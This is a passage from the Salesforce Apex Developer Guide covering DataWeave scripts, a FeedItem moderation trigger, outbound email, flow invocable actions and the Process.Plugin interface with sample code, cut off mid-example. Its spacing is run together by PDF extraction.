API version 63.0 and later: DataWeave 2.9
SEE ALSO:
Limitations of DataWeave in Apex
Examples of DataWeave in Apex
Here are code samples that demonstrate DataWeave in Apex.
To use DataWeave in Apex, follow these instructions with associated examples.
•
Create a DataWeave script source file.
For example: csvToContacts.dwl.
%dw 2.0
inputrecordsapplication/csv
outputapplication/apex
---
recordsmap(record)-> {
FirstName:record.first_name,
LastName:record.last_name,
Email:record.email
} as Object{class:"Contact"}
•
Create the associated metadata file.
For example: csvToContacts.dwl-meta.xml.
<?xmlversion="1.0"encoding="UTF-8"?>
<DataWeaveResourcexmlns="http://soap.sforce.com/2006/04/metadata">
<apiVersion>58.0</apiVersion>
<isGlobal>false</isGlobal>
</DataWeaveResource>
•
Push the source to the scratch org using Salesforce CLI version v7.151.9 or higher. See Salesforce CLI Release Notes.
•
Invoke the DataWeave script from Apex and check the results from anonymous Apex.
This example invokes the csvToContacts.dwl script.
// CSV datafor Contacts
StringinputCsv= 'first_name,last_name,email\nCodey,"TheBear",codey@salesforce.com';
DataWeave.Scriptdwscript= new DataWeaveScriptResource.csvToContacts();
DataWeave.Resultdwresult= dwscript.execute(newMap<String,Object>{'records'=>
inputCsv});
List<Contact>results= (List<Contact>)dwresult.getValue();
Assert.areEqual(1,results.size());
ContactcodeyContact= results[0];
Assert.areEqual('Codey',codeyContact.FirstName);
Assert.areEqual('TheBear',codeyContact.LastName);
Note:  Extensive code samples that demonstrate the DataWeave in Apex feature are available on Developerforce.
467
Using Salesforce Features with ApexApex Developer Guide

Limitations of DataWeave in Apex
DataWeave in Apex has these limitations.
•
The DataWeave Java bridge, that is, the ability to bind to static Java methods is disabled. See Introduction to Mule 4. Features that
interact with the environment such as the readURL and envVar functions are also disabled. These checks are done at script
creation time instead of at runtime.
•
You must specify an encoding for binary input (Apex Blobs) to be coerced to strings: binaryVariableas String
{encoding:'utf8'}".
•
DataWeave is constrained to disallow the loading of additional libraries. Therefore, scripts must be self-contained.
•
DataWeave modules and importing other scripts aren’t supported. For example, importmodules::MyMapping as per
Using a Mapping File in a DataWeave Script isn’t supported.
Note:  The feature supports built-in modules. See DataWeave Reference.
•
DataWeave in Apex doesn’t support these content types.
–
Flat File Format  (application/flatfile)
–
Excel (application/xlsx)
–
Avro (application/avro)
•
Apex classes must be at API version 53.0 or later to access DataWeave integration methods.
•
There’s a maximum of 50 DataWeave scripts per org.
•
The maximum body size of one DataWeave script is 100,000 (one hundred thousand) characters.
Note:  XML Entity Expansion isn’t supported, either currently or in the future, as a guard against denial of service attacks.
Moderate Feed Items with Triggers
EDITIONS
Available in: Enterprise,
Performance, Unlimited,
and Developer Editions
USER PERMISSIONS
To save Apex triggers for
FeedItem:
•Author Apex
Write a trigger for FeedItem to automate the moderation of posts in an org or Experience Cloud
site. Use triggers to ensure that posts conform to your company’s communication policies and
don’t contain unwanted words or phrases.
Write an Apex before insert trigger to review the feed item body and change the status of the feed
item if it contains a blocklisted phrase. To create a trigger for feed items from Setup, enter
FeedItemTriggers in the QuickFind box, then select FeedItem Triggers. Alternatively,
you can create a trigger from the Developer Console by clicking File > New > Apex Trigger and
selecting FeedItem from the sObject drop-down list.
This example shows a before insert trigger on FeedItem that is used to review each new post. If the
post contains the unwanted phrase, the trigger also sets the status of the post to
PendingReview.
triggerReviewFeedItemon FeedItem(beforeinsert) {
for (Integeri = 0; i<trigger.new.size();i++){
// We don'twantto leak"testphrase"information.
if (trigger.new[i].body.containsIgnoreCase('testphrase')) {
trigger.new[i].status= 'PendingReview';
System.debug('caughtone for pendingReview');
}
468
Using Salesforce Features with ApexApex Developer Guide

}
}
Experience Cloud Sites
Experience Cloud sites are branded spaces for your employees, customers, and partners to connect. You can customize and create sites
to meet your business needs, then transition seamlessly between them.
Interact with Experience Cloud sites in Apex using the Network class and using Connect in Apex classes in the ConnectApi
namespace.
Connect in Apex has a ConnectApi.Communities class with methods that return information about sites. Many Connect in
Apex methods take a communityId argument, and some Connect in Apex methods take a siteId argument
SEE ALSO:
Apex Reference Guide: Network Class
Apex Reference Guide: Connect in Apex
Email
You can use Apex to work with inbound and outbound email.
Use Apex with these email features:
Inbound Email
Use Apex to work with email sent to Salesforce.
Outbound Email
Use Apex to work with email sent from Salesforce.
Inbound Email
Use Apex to work with email sent to Salesforce.
You can use Apex to receive and process email and attachments. The email is received by the Apex email service, and processed by
Apex classes that utilize the InboundEmail object.
Note:  The Apex email service is only available in Developer, Enterprise, Unlimited, and Performance Edition organizations.
See Apex Email Service.
Outbound Email
Use Apex to work with email sent from Salesforce.
You can use Apex to send individual and mass email. The email can include all standard email attributes (such as subject line and blind
carbon copy address), use Salesforce email templates, and be in plain text or HTML format, or those generated by Visualforce.
Note:  Visualforce email templates cannot be used for mass email.
You can use Salesforce to track the status of email in HTML format, including the date the email was sent, first opened and last opened,
and the total number of times it was opened.
469
Using Salesforce Features with ApexApex Developer Guide

To send individual and mass email with Apex, use the following classes:
SingleEmailMessage
Instantiates an email object used for sending a single email message. The syntax is:
Messaging.SingleEmailMessagemail= new Messaging.SingleEmailMessage();
MassEmailMessage
Instantiates an email object used for sending a mass email message. The syntax is:
Messaging.MassEmailMessagemail= new Messaging.MassEmailMessage();
Messaging
Includes the static sendEmail method, which sends the email objects you instantiate with either the SingleEmailMessage
or MassEmailMessage classes, and returns a SendEmailResult object.
The syntax for sending an email is:
Messaging.sendEmail(new Messaging.Email[] { mail} ,opt_allOrNone);
where Email is either Messaging.SingleEmailMessage or Messaging.MassEmailMessage.
The optional opt_allOrNone parameter specifies whether sendEmail prevents delivery of all other messages when any of
the messages fail due to an error (true), or whether it allows delivery of the messages that don't have errors (false). The default
is true.
Includes the static reserveMassEmailCapacity and reserveSingleEmailCapacity methods, which can be
called before sending any emails to ensure that the sending organization doesn’t exceed its daily email limit when the transaction
is committed and emails are sent. The syntax is:
Messaging.reserveMassEmailCapacity(count);
and
Messaging.reserveSingleEmailCapacity(count);
where count indicates the total number of addresses that emails will be sent to.
Note the following:
•
The email is not sent until the Apex transaction is committed.
•
The email address of the user calling the sendEmail method is inserted in the FromAddress field of the email header. All
email that is returned, bounced, or received out-of-office replies goes to the user calling the method.
•
Maximum of 10 sendEmail methods per transaction. Use the Limits methods to verify the number of sendEmail methods
in a transaction.
•
Single email messages sent with the sendEmail method count against the sending organization's daily single email limit. When
this limit is reached, calls to the sendEmail method using SingleEmailMessage are rejected, and the user receives a
SINGLE_EMAIL_LIMIT_EXCEEDED error code. However, single emails sent through the application are allowed.
•
Mass email messages sent with the sendEmail method count against the sending organization's daily mass email limit. When
this limit is reached, calls to the sendEmail method using MassEmailMessage are rejected, and the user receives a
MASS_MAIL_LIMIT_EXCEEDED error code.
•
Any error returned in the SendEmailResult object indicates that no email was sent.
Messaging.SingleEmailMessage has a method called setOrgWideEmailAddressId. It accepts an object ID to an
OrgWideEmailAddress object. If setOrgWideEmailAddressId is passed a valid ID, the
OrgWideEmailAddress.DisplayName field is used in the email header, instead of the logged-in user's DisplayName.
The sending email address in the header is also set to the field defined in OrgWideEmailAddress.Address.
470
Using Salesforce Features with ApexApex Developer Guide

Note:  If both OrgWideEmailAddress.DisplayName and setSenderDisplayName are defined, the user receives
a DUPLICATE_SENDER_DISPLAY_NAME error.
For more information, see Organization-Wide Email Addresses in the Salesforce Help .
Example
// First,reserveemailcapacityfor the currentApextransactionto ensure
// thatwe won'texceedour dailyemaillimitswhensendingemailafter
// the currenttransactionis committed.
Messaging.reserveSingleEmailCapacity(2);
// Processesand actionsinvolvedin the Apextransactionoccurnext,
// whichconcludewithsendinga singleemail.
// Now createa new singleemailmessageobject
// thatwillsendout a singleemailto the addressesin the To, CC & BCC list.
Messaging.SingleEmailMessagemail= new Messaging.SingleEmailMessage();
// Stringsto holdthe emailaddressesto whichyou are sendingthe email.
String[] toAddresses= new String[] {'user@acme.com'};
String[] ccAddresses= new String[] {'smith@gmail.com'};
// Assignthe addressesfor the To and CC liststo the mailobject.
mail.setToAddresses(toAddresses);
mail.setCcAddresses(ccAddresses);
// Specifythe addressusedwhenthe recipientsreplyto the email.
mail.setReplyTo('support@acme.com');
// Specifythe nameusedas the displayname.
mail.setSenderDisplayName('SalesforceSupport');
// Specifythe subjectlinefor youremailaddress.
mail.setSubject('NewCaseCreated: ' + case.Id);
// Set to Trueif you wantto BCC yourselfon the email.
mail.setBccSender(false);
// Optionallyappendthe Salesforceemailsignatureto the email.
// The emailaddressof the userexecutingthe ApexCodewillbe used.
mail.setUseSignature(false);
// Specifythe textcontentof the email.
mail.setPlainTextBody('YourCase:' + case.Id +' has beencreated.');
mail.setHtmlBody('Yourcase:<b>' + case.Id +' </b>hasbeencreated.<p>'+
'To viewyourcase<a href=https://MyDomainName.my.salesforce.com/'+case.Id+'>click
here.</a>');
// Sendthe emailyou havecreated.
Messaging.sendEmail(new Messaging.SingleEmailMessage[]{ mail});
471
Using Salesforce Features with ApexApex Developer Guide

External Services
External Services connect your Salesforce org to a service outside of Salesforce, such as an employee banking service. After you register
the external service, you can call it natively in your Apex code. Objects and operations defined in the external service's registered API
specification become Apex classes and methods in the ExternalService namespace. The registered service's schema types map
to Apex types, and are strongly typed, making the Apex compiler do the heavy lifting for you. For example, you can make a type safe
callout to an external service from Apex without needing to use the Http class or perform transforms on JSON strings.
SEE ALSO:
Salesforce Help: Invoke External Service Callouts Using Apex
Flows
Flow Builder lets admins build applications, known as flows, that automate a business process by collecting data and doing something
in your Salesforce org or an external system.
For example, you can create a flow to script calls for a customer support center or to generate real-time quotes for a sales team. You can
embed a flow in a Visualforce page or Aura component and access it in an Apex controller.
For more information about using Apex to start a flow, see Apex Reference Guide: Interview Class.
Getting Flow Variables
You can retrieve flow variables for a specific flow in Apex.
Making Callouts to External Systems from Invocable Actions
When you define a method that runs as an invocable action in a screen flow and makes a callout to an external system, use the
callout modifier.
Customize Invocable Action Input Order in Flow Builder
Control the display order and grouping of input parameters for your Apex invocable actions in Flow Builder using the
InvocableActionExtension metadata file.
Passing Data to a Flow Using the Process.Plugin Interface
Process.Pluginis a built-in interface that lets you process data within your org and pass it to a specified flow. The interface
exposes Apex as a service, which accepts input values and returns output back to the flow.
Getting Flow Variables
You can retrieve flow variables for a specific flow in Apex.
The Flow.Interview Apex class provides the getVariableValue method for retrieving a flow variable, which can be in the
flow embedded in the Visualforce page, or in a separate flow that is called by a subflow element. This example shows how to use this
method to obtain breadcrumb (navigation) information from the flow embedded in the Visualforce page. If that flow contains subflow
elements, and each of the referenced flows also contains a vaBreadCrumb variable, the Visualforce page can provide users with
breadcrumbs regardless of which flow the interview is running.
publicclassSampleContoller{
// Instanceof the flow
publicFlow.Interview.Flow_Template_GallerymyFlow{get;set;}
publicStringgetBreadCrumb(){
StringaBreadCrumb;
472
Using Salesforce Features with ApexApex Developer Guide

if (myFlow==null) { return'Home';}
elseaBreadCrumb= (String) myFlow.getVariableValue('vaBreadCrumb');
return(aBreadCrumb==null? 'Home': aBreadCrumb);
}
}
SEE ALSO:
Apex Reference Guide: Interview Class
Making Callouts to External Systems from Invocable Actions
When you define a method that runs as an invocable action in a screen flow and makes a callout to an external system, use the callout
modifier.
When the method is executed as an invocable action, screen flows use this modifier to determine whether the action can be executed
safely in the current transaction. Flow admins can configure the action to let the flow decide whether to execute the action in a new
transaction or the current one.
When all of these conditions are met, the flow commits the current transaction, starts a new transaction, and makes the call to an external
system safely.
•
The method's callout modifier is true.
•
The action's Transaction Control setting in a screen flow is configured to let the flow decide.
•
The current transaction has uncommitted work.
If any of these conditions are true, the flow executes the action in the current transaction.
•
The callout modifier is false.
•
The action is executed by a non-screen flow.
•
The current transaction doesn’t have uncommitted work.
SEE ALSO:
InvocableMethod Annotation
Customize Invocable Action Input Order in Flow Builder
Control the display order and grouping of input parameters for your Apex invocable actions in Flow Builder using the
InvocableActionExtension metadata file.
Example: Sorting Booking Request Inputs
An Apex class for a travel application, BookingAction, uses a custom input type, BookingRequest, to manage two required
dates: startDate and endDate. By default, the flow displays inputs alphabetically. Use the InvocableActionExtension metadata
file to define the logical order and group the fields under a relevant section header to improve the user experience.
Create the Apex Invocable Action
This section shows the Apex class structure required for the invocable action that exposes configurable input parameters to a flow.
473
Using Salesforce Features with ApexApex Developer Guide

This Apex class creates an invocable action, BookingAction, designed to send a booking request to an external system. Note that
the method accepts a List input to support bulk processing, a best practice for Apex development.
Note:  Users who invoke the action from a flow must have the appropriate Apex class access set in their profile or permission set.
publicclassBookingAction{
@InvocableMethod(
label='BookingRequest'
description='Sendsa bookingreservationrequestto bookingsystem'
category='BookingIntegrations'
callout=true// Indicatesthisactionmakesan externalcallout
)
publicstaticList<BookingResult>invoke(List<BookingRequest>request){
// Apexbusinesslogicgoeshereto processthe bookingrequests.
// Thisprocessmustbe designedto handlemultiplerequests(bulkified).
// Examplemocklogic:
List<BookingResult>results= new List<BookingResult>();
for (BookingRequestreq : request){
BookingResultresult= new BookingResult();
result.status= 'Bookingrequestreceivedfor dates:' + req.startDate+ ' to
' + req.endDate;
results.add(result);
}
returnresults;
}
publicclassBookingRequest{
@InvocableVariable(
label='RequestedStartDate'
description='Thestartdatefor the booking.'
required=true
)
publicDatestartDate;
@InvocableVariable(
label='RequestedEnd Date'
description='Theend datefor the booking.'
required=true
)
publicDateendDate;
}
publicclassBookingResult{
@InvocableVariable(
label='StatusMessage'
)
publicStringstatus;
// Includeotheroutputvariablesas needed.
}
}
The invoke method uses the @InvocableMethod annotation to be callable from a flow. Input and output are defined by the
inner classes, BookingRequest and BookingResult, ensuring data integrity. The individual input variables within
474
Using Salesforce Features with ApexApex Developer Guide

BookingRequest use the @InvocableVariable annotation, which allows them to be exposed as configurable fields in Flow
Builder.
Define Input Order with Invocable Action Extension
Use the InvocableActionExtension metadata file to specify the sort order of the input fields and organize them into collapsible groups
for improved usability in Flow Builder.
The file must have the suffix .invocableactionextension-meta.xml and the filename corresponds to the Apex class name, for example,
BookingAction.invocableactionextension-meta.xml. Add the metadata file to the invocableactionextensions directory.
This metadata file targets each input parameter and uses the <key>Order</key> attribute so the start date appears before the
end date. It also uses the <key>Group</key> attribute to organize both inputs under a single collapsible section named Booking
Dates.
Important:  To sort the order of input fields, define an Order for all input parameters for the action. If you define an Order
for at least one parameter, you must define an Order for all parameters within the action to avoid unexpected behavior.
<?xmlversion="1.0"encoding="UTF-8"?>
<InvocableActionExtensionxmlns="http://soap.sforce.com/2006/04/metadata">
<targets>
<targetType>ActionParameter</targetType>
<targetName>BookingAction.BookingRequest.startDate</targetName>
<attributes>
<key>Order</key>
<dataType>Integer</dataType>
<value>1</value> </attributes>
<attributes>
<key>Group</key>
<dataType>String</dataType>
<value>BookingDates</value> </attributes>
</targets>
<targets>
<targetType>ActionParameter</targetType>
<targetName>BookingAction.BookingRequest.endDate</targetName>
<attributes>
<key>Order</key>
<dataType>Integer</dataType>
<value>2</value> </attributes>
<attributes>
<key>Group</key>
<dataType>String</dataType>
<value>BookingDates</value> </attributes>
</targets>
</InvocableActionExtension>
475
Using Salesforce Features with ApexApex Developer Guide

The <targets> elements identify the specific input parameters to be customized. The <key>Order</key> attribute explicitly
controls the vertical display sequence of the input parameters in Flow Builder. The <key>Group</key> attribute is used to create
the collapsible Booking Dates section, improving the organization and scannability of the action's inputs.
SEE ALSO:
InvocableMethod Annotation
InvocableVariable Annotation
Metadata API Developer Guide: InvocableActionExtension
Passing Data to a Flow Using the Process.Plugin Interface
Process.Pluginis a built-in interface that lets you process data within your org and pass it to a specified flow. The interface exposes
Apex as a service, which accepts input values and returns output back to the flow.
Tip:  We recommend using the @InvocableMethod annotation instead of the Process.Plugin interface.
•
The interface doesn’t support Blob, Collection, and sObject, data types, and it doesn’t support bulk operations. After you
implement the interface on a class, the class can be referenced only from flows.
•
The annotation supports all data types and bulk operations. After you implement the annotation on a class, the class can be
referenced from flows, processes, and the Custom Invocable Actions REST API endpoint.
•
Legacy Apex actions aren’t supported in auto-layout in Flow Builder. Legacy Apex actions are only available to be added in
free-form in Flow Builder. Existing actions can be edited in both auto-layout and free-form mode.
When you define an Apex class that implements the Process.Plugin interface in your org, it's available in Flow Builder as a legacy
Apex action.
Process.Plugin has these top-level classes.
•
Process.PluginRequest passes input parameters from the class that implements the interface to the flow.
•
Process.PluginResult returns output parameters from the class that implements the interface to the flow.
•
Process.PluginDescribeResult passes input parameters from a flow to the class that implements the interface. This
class determines the input parameters and output parameters needed by the Process.PluginResult plug-in.
When you write Apex unit tests, instantiate a class and pass it into the interface invoke method. To pass in the parameters that the
system needs, create a map and use it in the constructor. For more information, see Using the Process.PluginRequest Class on page 478.
Implementing the Process.Plugin Interface
Process.Plugin is a built-in interface that allows you to pass data between your organization and a specified flow.
476
Using Salesforce Features with ApexApex Developer Guide

Using the Process.PluginRequest Class
The Process.PluginRequest class passes input parameters from the class that implements the interface to the flow.
Using the Process.PluginResult Class
The Process.PluginResult class returns output parameters from the class that implements the interface to the flow.
Using the Process.PluginDescribeResult Class
Use the Process.Plugin interface describe method to dynamically provide both input and output parameters for the
flow. This method returns the Process.PluginDescribeResult class.
Process.Plugin Data Type Conversions
Understand how data types are converted between Apex and the values returned to the Process.Plugin. For example, text
data in a flow converts to string data in Apex.
Sample Process.Plugin Implementation for Lead Conversion
In this example, an Apex class implements the Process.Plugin interface and converts a lead into an account, contact, and
optionally, an opportunity. Test methods for the plug-in are also included. This implementation can be called from a flow via a legacy
Apex action.
Implementing the Process.Plugin Interface
Process.Plugin is a built-in interface that allows you to pass data between your organization and a specified flow.
Tip:  We recommend using the @InvocableMethod annotation instead of the Process.Plugin interface.
•
The interface doesn’t support Blob, Collection, and sObject, data types, and it doesn’t support bulk operations. After you
implement the interface on a class, the class can be referenced only from flows.
•
The annotation supports all data types and bulk operations. After you implement the annotation on a class, the class can be
referenced from flows, processes, and the Custom Invocable Actions REST API endpoint.
•
Legacy Apex actions aren’t supported in auto-layout in Flow Builder. Legacy Apex actions are only available to be added in
free-form in Flow Builder. Existing actions can be edited in both auto-layout and free-form mode.
The class that implements the Process.Plugin interface must call these methods.
DescriptionReturn TypeArgumentsName
Returns a
Process.PluginDescribeResult
object that describes this method call.
Process.PluginDescribeResultdescribe
Primary method that the system invokes
when the class that implements the
interface is instantiated.
Process.PluginResultProcess.PluginRequestinvoke
Example Implementation
globalclassflowChatimplementsProcess.Plugin{
// The mainmethodto be implemented.The Flowcallsthisat runtime.
globalProcess.PluginResultinvoke(Process.PluginRequestrequest){
// Get the subjectof the Chatterpostfromthe flow
Stringsubject= (String) request.inputParameters.get('subject');
477
Using Salesforce Features with ApexApex Developer Guide

// Use the ChatterAPIsto postit to the currentuser'sfeed
FeedItemfItem= new FeedItem();
fItem.ParentId= UserInfo.getUserId();
fItem.Body= 'FlowUpdate:' + subject;
insertfItem;
// returnto Flow
Map<String,Object> result= new Map<String,Object>();
returnnew Process.PluginResult(result);
}
// Returnsthe describeinformationfor the interface
globalProcess.PluginDescribeResultdescribe(){
Process.PluginDescribeResultresult= new Process.PluginDescribeResult();
result.Name= 'flowchatplugin';
result.Tag= 'chat';
result.inputParameters= new
List<Process.PluginDescribeResult.InputParameter>{
new Process.PluginDescribeResult.InputParameter('subject',
Process.PluginDescribeResult.ParameterType.STRING,true)
};
result.outputParameters= new
List<Process.PluginDescribeResult.OutputParameter>{};
returnresult;
}
}
Test Class
The following is a test class for the preceding class.
@isTest
privateclassflowChatTest{
statictestmethodvoidflowChatTests(){
flowChatplugin= new flowChat();
Map<String,Object> inputParams= new Map<String,Object>();
stringfeedSubject= 'Flowis alive';
InputParams.put('subject', feedSubject);
Process.PluginRequestrequest= new Process.PluginRequest(inputParams);
plugin.invoke(request);
}
}
Using the Process.PluginRequest Class
The Process.PluginRequest class passes input parameters from the class that implements the interface to the flow.
478
Using Salesforce Features with ApexApex Developer Guide

Tip:  We recommend using the @InvocableMethod annotation instead of the Process.Plugin interface.
•
The interface doesn’t support Blob, Collection, and sObject, data types, and it doesn’t support bulk operations. After you
implement the interface on a class, the class can be referenced only from flows.
•
The annotation supports all data types and bulk operations. After you implement the annotation on a class, the class can be
referenced from flows, processes, and the Custom Invocable Actions REST API endpoint.
•
Legacy Apex actions aren’t supported in auto-layout in Flow Builder. Legacy Apex actions are only available to be added in
free-form in Flow Builder. Existing actions can be edited in both auto-layout and free-form mode.
This class has no methods.
Constructor signature:
Process.PluginRequest(Map<String,Object>)
Here’s an example of instantiating the Process.PluginRequest class with one input parameter.
Map<String,Object> inputParams= new Map<String,Object>();
stringfeedSubject= 'Flowis alive';
InputParams.put('subject', feedSubject);
Process.PluginRequestrequest= new Process.PluginRequest(inputParams);
Code Example
In this example, the code returns the subject of a Chatter post from a flow and posts it to the current user's feed.
globalProcess.PluginResultinvoke(Process.PluginRequestrequest){
// Get the subjectof the Chatterpostfromthe flow
Stringsubject= (String) request.inputParameters.get('subject');
// Use the ChatterAPIsto postit to the currentuser'sfeed
FeedPostfpost= new FeedPost();
fpost.ParentId= UserInfo.getUserId();
fpost.Body= 'FlowUpdate:' + subject;
insertfpost;
// returnto Flow
Map<String,Object> result= new Map<String,Object>();
returnnew Process.PluginResult(result);
}
// describesthe interface
globalProcess.PluginDescribeResultdescribe(){
Process.PluginDescribeResultresult= new Process.PluginDescribeResult();
result.inputParameters= new List<Process.PluginDescribeResult.InputParameter>{
new Process.PluginDescribeResult.InputParameter('subject',
Process.PluginDescribeResult.ParameterType.STRING,true)
};
result.outputParameters= new List<Process.PluginDescribeResult.OutputParameter>{
};
returnresult;
}
}
479
Using Salesforce Features with ApexApex Developer Guide

Using the Process.PluginResult Class
The Process.PluginResult class returns output parameters from the class that implements the interface to the flow.
Tip:  We recommend using the @InvocableMethod annotation instead of the Process.Plugin interface.
•
The interface doesn’t support Blob, Collection, and sObject, data types, and it doesn’t support bulk operations. After you
implement the interface on a class, the class can be referenced only from flows.
•
The annotation supports all data types and bulk operations. After you implement the annotation on a class, the class can be
referenced from flows, processes, and the Custom Invocable Actions REST API endpoint.
•
Legacy Apex actions aren’t supported in auto-layout in Flow Builder. Legacy Apex actions are only available to be added in
free-form in Flow Builder. Existing actions can be edited in both auto-layout and free-form mode.
You can instantiate the Process.PluginResult class using one of the following formats:
•
Process.PluginResult(Map<String,Object>)
•
Process.PluginResult(String, Object)
Use the map when you have more than one result or when you don't know how many results are returned.
The following is an example of instantiating a Process.PluginResult class.
stringurl = 'https://docs.google.com/document/edit?id=abc';
Stringstatus= 'Success';
Map<String,Object> result= new Map<String,Object>();
result.put('url', url);
result.put('status',status);
new Process.PluginResult(result);
Using the Process.PluginDescribeResult Class
Use the Process.Plugin interface describe method to dynamically provide both input and output parameters for the flow.
This method returns the Process.PluginDescribeResult class.
Tip:  We recommend using the @InvocableMethod annotation instead of the Process.Plugin interface.
•
The interface doesn’t support Blob, Collection, and sObject, data types, and it doesn’t support bulk operations. After you
implement the interface on a class, the class can be referenced only from flows.
•
The annotation supports all data types and bulk operations. After you implement the annotation on a class, the class can be
referenced from flows, processes, and the Custom Invocable Actions REST API endpoint.
•
Legacy Apex actions aren’t supported in auto-layout in Flow Builder. Legacy Apex actions are only available to be added in
free-form in Flow Builder. Existing actions can be edited in both auto-layout and free-form mode.
The Process.PluginDescribeResult class doesn’t support the following functions.
•
Queries
•
Data modification
•
Email
•
Apex nested callouts
480
Using Salesforce Features with ApexApex Developer Guide

Process.PluginDescribeResult Class and Subclass Properties
Here’s the constructor for the Process.PluginDescribeResult class.
Process.PluginDescribeResultclassname= new Process.PluginDescribeResult();
•
PluginDescribeResult Class Properties
•
PluginDescribeResult.InputParameter Class Properties
•
PluginDescribeResult.OutputParameter Class Properties
Here’s the constructor for the Process.PluginDescribeResult.InputParameter class.
Process.PluginDescribeResult.InputParameterip= new
Process.PluginDescribeResult.InputParameter(Name,Optional_description_string,
Process.PluginDescribeResult.ParameterType.Enum,Boolean_required);
Here’s the constructor for the Process.PluginDescribeResult.OutputParameter class.
Process.PluginDescribeResult.OutputParameterop= new
new Process.PluginDescribeResult.OutputParameter(Name,Optionaldescriptionstring,
Process.PluginDescribeResult.ParameterType.Enum);
To use the Process.PluginDescribeResult class, create instances of these subclasses.
•
Process.PluginDescribeResult.InputParameter
•
Process.PluginDescribeResult.OutputParameter
Process.PluginDescribeResult.InputParameter is a list of input parameters and has the following format.
Process.PluginDescribeResult.inputParameters=
new List<Process.PluginDescribeResult.InputParameter>{
new Process.PluginDescribeResult.InputParameter(Name,Optional_description_string,
Process.PluginDescribeResult.ParameterType.Enum,Boolean_required)
For example:
Process.PluginDescribeResultresult= new Process.PluginDescribeResult();
result.setDescription('thisplugingetsthe nameof a user');
result.setTag('userinfo');
result.inputParameters= new List<Process.PluginDescribeResult.InputParameter>{
new Process.PluginDescribeResult.InputParameter('FullName',
Process.PluginDescribeResult.ParameterType.STRING,true),
new Process.PluginDescribeResult.InputParameter('DOB',
Process.PluginDescribeResult.ParameterType.DATE,true),
};
Process.PluginDescribeResult.OutputParameter is a list of output parameters and has the following format.
Process.PluginDescribeResult.outputParameters= new
List<Process.PluginDescribeResult.OutputParameter>{
new Process.PluginDescribeResult.OutputParameter(Name,Optionaldescriptionstring,
Process.PluginDescribeResult.ParameterType.Enum)
For example:
Process.PluginDescribeResultresult= new Process.PluginDescribeResult();
result.setDescription('thisplugingetsthe nameof a user');
481
Using Salesforce Features with ApexApex Developer Guide

result.setTag('userinfo');
result.outputParameters= new List<Process.PluginDescribeResult.OutputParameter>{
new Process.PluginDescribeResult.OutputParameter('URL',
Process.PluginDescribeResult.ParameterType.STRING),
Both classes take the Process.PluginDescribeResult.ParameterType Enum. Valid values are:
•
BOOLEAN
•
DATE
•
DATETIME
•
DECIMAL
•
DOUBLE
•
FLOAT
•
ID
•
INTEGER
•
LONG
•
STRING
•
TIME
For example:
Process.PluginDescribeResultresult= new Process.PluginDescribeResult();
result.outputParameters= new List<Process.PluginDescribeResult.OutputParameter>{
new Process.PluginDescribeResult.OutputParameter('URL',
Process.PluginDescribeResult.ParameterType.STRING,true),
new Process.PluginDescribeResult.OutputParameter('STATUS',
Process.PluginDescribeResult.ParameterType.STRING),
};
Process.Plugin Data Type Conversions
Understand how data types are converted between Apex and the values returned to the Process.Plugin. For example, text data
in a flow converts to string data in Apex.
Tip:  We recommend using the @InvocableMethod annotation instead of the Process.Plugin interface.
•
The interface doesn’t support Blob, Collection, and sObject, data types, and it doesn’t support bulk operations. After you
implement the interface on a class, the class can be referenced only from flows.
•
The annotation supports all data types and bulk operations. After you implement the annotation on a class, the class can be
referenced from flows, processes, and the Custom Invocable Actions REST API endpoint.
•
Legacy Apex actions aren’t supported in auto-layout in Flow Builder. Legacy Apex actions are only available to be added in
free-form in Flow Builder. Existing actions can be edited in both auto-layout and free-form mode.
Data TypeFlow Data Type
DecimalNumber
Datetime/DateDate
Datetime/DateDateTime
482
Using Salesforce Features with ApexApex Developer Guide

Data TypeFlow Data Type
Boolean and numeric with 1 or 0 values onlyBoolean
StringText
Sample Process.Plugin Implementation for Lead Conversion
In this example, an Apex class implements the Process.Plugin interface and converts a lead into an account, contact, and
optionally, an opportunity. Test methods for the plug-in are also included. This implementation can be called from a flow via a legacy
Apex action.
Tip:  We recommend using the @InvocableMethod annotation instead of the Process.Plugin interface.
•
The interface doesn’t support Blob, Collection, and sObject, data types, and it doesn’t support bulk operations. After you
implement the interface on a class, the class can be referenced only from flows.
•
The annotation supports all data types and bulk operations. After you implement the annotation on a class, the class can be
referenced from flows, processes, and the Custom Invocable Actions REST API endpoint.
•
Legacy Apex actions aren’t supported in auto-layout in Flow Builder. Legacy Apex actions are only available to be added in
free-form in Flow Builder. Existing actions can be edited in both auto-layout and free-form mode.
// Convertsa leadas an actionin a flow.
globalclassVWFConvertLeadimplementsProcess.Plugin{
// Thismethodrunswhencalledby a flow'slegacyApexaction.
globalProcess.PluginResultinvoke(
Process.PluginRequestrequest){
// Set up variablesto storeinputparametersfrom
// the flow.
StringleadID= (String) request.inputParameters.get(
'LeadID');
StringcontactID= (String)
request.inputParameters.get('ContactID');
StringaccountID= (String)
request.inputParameters.get('AccountID');
StringconvertedStatus= (String)
request.inputParameters.get('ConvertedStatus');
BooleanoverWriteLeadSource= (Boolean)
request.inputParameters.get('OverwriteLeadSource');
BooleancreateOpportunity= (Boolean)
request.inputParameters.get('CreateOpportunity');
StringopportunityName= (String)
request.inputParameters.get('ContactID');
BooleansendEmailToOwner= (Boolean)
request.inputParameters.get('SendEmailToOwner');
// Set the defaulthandlingfor booleans.
if (overWriteLeadSource== null)
overWriteLeadSource= false;
if (createOpportunity== null)
createOpportunity= true;
if (sendEmailToOwner== null)
sendEmailToOwner= false;
483
Using Salesforce Features with ApexApex Developer Guide

// Convertthe leadby passingit to a helpermethod.
Map<String,Object> result= new Map<String,Object>();
result= convertLead(leadID,contactID,accountID,
convertedStatus,overWriteLeadSource,
createOpportunity,opportunityName,
sendEmailToOwner);
returnnew Process.PluginResult(result);
}
// Thismethoddescribesthe plug-inand its inputsfrom
// and outputsto the flow.
// Implementingthismethodmakesthe classavailable
// in FlowBuilderas a legacyApexaction.
globalProcess.PluginDescribeResultdescribe(){
// Set up pluginmetadata
Process.PluginDescribeResultresult= new
Process.PluginDescribeResult();
result.description=
'TheLeadConvertFlowPlug-inconvertsa leadinto' +
'an account,a contact,and ' +
'(optionally)anopportunity.';
result.tag= 'LeadManagement';
// Createa listthatstoresbothmandatoryand optional
// inputparametersfromthe flow.
// NOTE:Onlyprimitivetypes(STRING,NUMBER,etc.)are
// supported.Collectionsaren'tsupported.
result.inputParameters= new
List<Process.PluginDescribeResult.InputParameter>{
// LeadID (mandatory)
new Process.PluginDescribeResult.InputParameter(
'LeadID',
Process.PluginDescribeResult.ParameterType.STRING,
true),
// AccountId (optional)
new Process.PluginDescribeResult.InputParameter(
